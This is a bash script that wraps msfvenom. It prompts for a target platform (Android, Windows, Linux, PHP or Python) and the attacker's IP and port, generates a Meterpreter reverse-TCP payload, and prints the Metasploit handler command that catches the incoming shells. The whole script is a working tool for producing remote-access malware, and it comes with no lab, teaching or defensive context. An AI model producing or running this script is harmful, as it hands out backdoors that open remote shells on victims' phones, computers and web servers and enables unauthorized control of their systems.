#!/bin/bash

echo "========================================="
echo "       MSFVENOM PAYLOAD GENERATOR"
echo "========================================="
echo ""

echo "Payload types:"
echo "1. Android APK"
echo "2. Windows EXE"
echo "3. Linux ELF"
echo "4. PHP"
echo "5. Python"
echo ""
read -p "Select payload type (1-5): " PAYLOAD

read -p "Enter LHOST (your IP): " LHOST
read -p "Enter LPORT (4444): " LPORT
LPORT=${LPORT:-4444}

case $PAYLOAD in
    1) 
        echo "Generating Android payload..."
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o ~/payload.apk 2>/dev/null
        echo "✅ Payload saved: ~/payload.apk"
        ;;
    2)
        echo "Generating Windows payload..."
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o ~/payload.exe 2>/dev/null
        echo "✅ Payload saved: ~/payload.exe"
        ;;
    3)
        echo "Generating Linux payload..."
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o ~/payload.elf 2>/dev/null
        echo "✅ Payload saved: ~/payload.elf"
        ;;
    4)
        echo "Generating PHP payload..."
        msfvenom -p php/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -o ~/payload.php 2>/dev/null
        echo "✅ Payload saved: ~/payload.php"
        ;;
    5)
        echo "Generating Python payload..."
        msfvenom -p python/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o ~/payload.py 2>/dev/null
        echo "✅ Payload saved: ~/payload.py"
        ;;
    *) echo "Invalid option" ;;
esac

echo ""
echo "Set up Metasploit listener:"
echo "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $(case $PAYLOAD in 1) echo android/meterpreter/reverse_tcp;; 2) echo windows/meterpreter/reverse_tcp;; 3) echo linux/x86/meterpreter/reverse_tcp;; 4) echo php/meterpreter_reverse_tcp;; 5) echo python/meterpreter/reverse_tcp;; esac); set LHOST $LHOST; set LPORT $LPORT; exploit'"
